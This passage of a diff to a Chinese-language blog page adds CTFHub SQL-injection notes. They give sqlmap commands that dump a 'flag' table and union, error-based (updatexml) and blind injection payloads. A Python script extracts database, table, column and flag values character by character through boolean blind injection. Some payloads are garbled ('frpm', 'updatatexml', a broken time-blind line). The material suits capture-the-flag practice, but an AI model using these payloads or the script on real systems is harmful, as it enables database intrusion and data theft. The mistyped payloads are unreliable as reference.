+<a class="header-anchor" href="#%e7%ac%ac%e4%b8%89%e6%ad%a5%e6%9f%a5-flag-%e8%a1%a8%e9%87%8c%e6%9c%89%e5%93%aa%e4%ba%9b%e5%ad%97%e6%ae%b5"></a>
+第三步：查 flag 表里有哪些字段
+</h1><p>sqlmap -u &ldquo;<a href="http://challenge-e9289924cf2bdb4e.sandbox.ctfhub.com:10800/?id=1%22">http://challenge-e9289924cf2bdb4e.sandbox.ctfhub.com:10800/?id=1&quot;</a> -D sqli -T flag &ndash;columns</p>
+<h1 id="第四步把-flag-字段的数据拖下来">
+<a class="header-anchor" href="#%e7%ac%ac%e5%9b%9b%e6%ad%a5%e6%8a%8a-flag-%e5%ad%97%e6%ae%b5%e7%9a%84%e6%95%b0%e6%8d%ae%e6%8b%96%e4%b8%8b%e6%9d%a5"></a>
+第四步：把 flag 字段的数据拖下来
+</h1><p>sqlmap -u &ldquo;<a href="http://challenge-e9289924cf2bdb4e.sandbox.ctfhub.com:10800/?id=1%22">http://challenge-e9289924cf2bdb4e.sandbox.ctfhub.com:10800/?id=1&quot;</a> -D sqli -T flag -C flag &ndash;dump</p>
+<h1 id="ctfhub注入">
+<a class="header-anchor" href="#ctfhub%e6%b3%a8%e5%85%a5"></a>
+CTFhub注入
+</h1><h3 id="整数型注入">
+<a class="header-anchor" href="#%e6%95%b4%e6%95%b0%e5%9e%8b%e6%b3%a8%e5%85%a5"></a>
+整数型注入
+</h3><p>1 闭合方式就是1整数型</p>
+<p>?id=0 order by 2</p>
+<p>?id=0 union select 1,2</p>
+<p>union select 1,database()</p>
+<p>union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(){或者 16进制的该数据库名}</p>
+<p>union select 1,group_concat(column_name) from information_schema.columns where table_name=(十六进制的该表名)</p>
+<p>union select 1,flag from sqli.flag</p>
+<h3 id="字符型注入">
+<a class="header-anchor" href="#%e5%ad%97%e7%ac%a6%e5%9e%8b%e6%b3%a8%e5%85%a5"></a>
+字符型注入
+</h3><p>1‘ 闭合方式是 1’字符型</p>
+<p>?id=1&rsquo;</p>
+<p>?id=1&rsquo; order by 2 &ndash;+</p>
+<p>?id=0&rsquo; union select 1,2 &ndash;+</p>
+<p>?id=0&rsquo; union select 1,database() &ndash;+</p>
+<p>?id=0&rsquo; union select 1,group_concat(table_name) frpm information_schema.tables where table_schema=</p>
+<p>?id=0&rsquo; union select 1,flag from sqli.flag &ndash;+</p>
+<h3 id="报错注入">
+<a class="header-anchor" href="#%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5"></a>
+报错注入
+</h3><p>?id=1&rsquo;      回显报错 报错注入</p>
+<p>?id=1 and updatexml(1,concat(0x5e,database()),1)</p>
+<p>?id=1 and updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5e),1)</p>
+<p>?id=1 and updatatexml(1,concat(0x5e,(select group_concat(columns) from information_schema.columns where table_name=sqli),0x5e),1)</p>
+<p>?id=1 and updatexml(1,concat(0x5e,(select flag from sqli.flag),0x5e),1)</p>
+<p>?id=1 and updatexml(1,concat(0x5e,mid((select flag from sqli.flag),32),0x5e),1)</p>
+<h3 id="布尔盲注">
+<a class="header-anchor" href="#%e5%b8%83%e5%b0%94%e7%9b%b2%e6%b3%a8"></a>
+布尔盲注
+</h3><p>?id=1</p>
+<p>if(expr1,expr2,expr3),如果expr的值为true，则执行expr2语句，如果expr1的值为false,则执行expr3语句</p>
+<p>?id=if(substr(database(),1,1)=&ldquo;s&rdquo;,1,(select table_name from information_schema.tables))</p>
+<p>import requests</p>
+<p>urlOPEN = &lsquo;<a href="http://challenge-5aaeb58d25ce5ac1.sandbox.ctfhub.com:10800">http://challenge-5aaeb58d25ce5ac1.sandbox.ctfhub.com:10800</a>&rsquo; #换成自己环境的url
+starOperatorTime = []
+mark = &lsquo;query_success&rsquo;</p>
+<p>def database_name():
+name = &rsquo;&rsquo;
+for j in range(1,9):
+for i in &lsquo;sqcwertyuioplkjhgfdazxvbnm&rsquo;:
+url = urlOPEN+&rsquo;/?id=if(substr(database(),%d,1)=&quot;%s&rdquo;,1,(select table_name from information_schema.tables))&rsquo; %(j,i)
+# print(url+&rsquo;%23&rsquo;)
+r = requests.get(url)
+if mark in r.text:
+name = name+i</p>
+<pre><code>            print(name)
+ 
+            break
+print('database_name:',name)
+</code></pre>
+<p>def table_name():
+list = []
+for k in range(0,4):
+name=&rsquo;&rsquo;
+for j in range(1,9):
+for i in &lsquo;sqcwertyuioplkjhgfdazxvbnm&rsquo;:
+url = urlOPEN+&rsquo;/?id=if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)=&quot;%s&rdquo;,1,(select table_name from information_schema.tables))&rsquo; %(k,j,i)
+# print(url+&rsquo;%23&rsquo;)
+r = requests.get(url)
+if mark in r.text:
+name = name+i
+break
+list.append(name)
+print(&rsquo;table_name:&rsquo;,list)</p>
+<p>def column_name():
+list = []
+for k in range(0,3): #判断表里最多有4个字段
+name=&rsquo;&rsquo;
+for j in range(1,9): #判断一个 字段名最多有9个字符组成
+for i in &lsquo;sqcwertyuioplkjhgfdazxvbnm&rsquo;:
+url=urlOPEN+&rsquo;/?id=if(substr((select column_name from information_schema.columns where table_name=&ldquo;flag&quot;and table_schema= database() limit %d,1),%d,1)=&quot;%s&rdquo;,1,(select table_name from information_schema.tables))&rsquo; %(k,j,i)
+r=requests.get(url)
+if mark in r.text:
+name=name+i
+break
+list.append(name)
+print (&lsquo;column_name:&rsquo;,list)</p>
+<p>def get_data():
+name=&rsquo;&rsquo;
+for j in range(1,50): #判断一个值最多有51个字符组成
+for i in range(48,126):
+url=urlOPEN+&rsquo;/?id=if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))&rsquo; %(j,i)
+r=requests.get(url)
+if mark in r.text:
+name=name+chr(i)
+print(name)
+break
+print (&lsquo;value:&rsquo;,name)</p>
+<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:
+database_name()
+table_name()
+column_name()
+get_data()</p>
+<h3 id="时间盲注">
+<a class="header-anchor" href="#%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8"></a>
+时间盲注
+</h3><p>/?id=id((substr(database(),1,1)=&rsquo;s&rsquo;,sleep(5),1)</p>
 </div>
     <footer class="article-footer"><div class="share-wrapper"></div><ul class="article-category-list"></ul>
 <ul class="article-tag-list" itemprop="keywords"></ul>
@@ -2351,10 +2915,10 @@ git add &lt;文件名&gt;                    # 标记冲突已解决
         >
       </div><div>
         <span class="icon-brush"
-          >&nbsp;2.9k</span
+          >&nbsp;4.0k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;00:15</span>
+        <span class="icon-coffee">&nbsp;00:20</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -2525,6 +3089,64 @@ git add &lt;文件名&gt;                    # 标记冲突已解决
     <li><a href="#githack">GitHack</a>
       <ul>
         <li><a href="#四一条完整的解题思路总结">四、一条完整的解题思路总结</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#svn-是什么">SVN 是什么？</a></li>
+        <li><a href="#svn-文件夹里有什么"><code>.svn</code> 文件夹里有什么？</a></li>
+      </ul>
+    </li>
+    <li><a href="#工具">工具</a></li>
+    <li><a href="#perl">perl</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#通俗理解">通俗理解</a></li>
+      </ul>
+    </li>
+    <li><a href="#找flag">找flag</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#详情">详情</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#dvcs-如-git-是现代开发的主流">DVCS (如 Git) 是现代开发的主流</a></li>
+        <li><a href="#2-cvcs-如-svn-在一些领域仍有使用">2. CVCS (如 SVN) 在一些领域仍有使用</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#一句话理解这四个关键词">一句话理解这四个关键词</a></li>
+    <li><a href="#你举的这个例子拆开看">你举的这个例子拆开看</a></li>
+    <li><a href="#你在-sql-注入里是怎么用的">你在 SQL 注入里是怎么用的？</a>
+      <ul>
+        <li><a href="#步骤一测列数-order-by">步骤一：测列数 (<code>ORDER BY</code>)</a></li>
+        <li><a href="#步骤二找注入数据的来源-union-select--from--where-">步骤二：找注入数据的来源 (<code>UNION SELECT ... FROM ... WHERE ...</code>)</a></li>
+        <li><a href="#步骤三最终拿-flag-union-select-flag-from-sqliflag">步骤三：最终拿 Flag (<code>UNION SELECT flag FROM sqli.flag</code>)</a></li>
+      </ul>
+    </li>
+    <li><a href="#你不需要死记硬背记住这三句口诀就行">你不需要死记硬背，记住这三句口诀就行</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#整数型注入">整数型注入</a></li>
+        <li><a href="#字符型注入">字符型注入</a></li>
+        <li><a href="#报错注入">报错注入</a></li>
+        <li><a href="#布尔盲注">布尔盲注</a></li>
+        <li><a href="#时间盲注">时间盲注</a></li>
       </ul>
     </li>
   </ul>
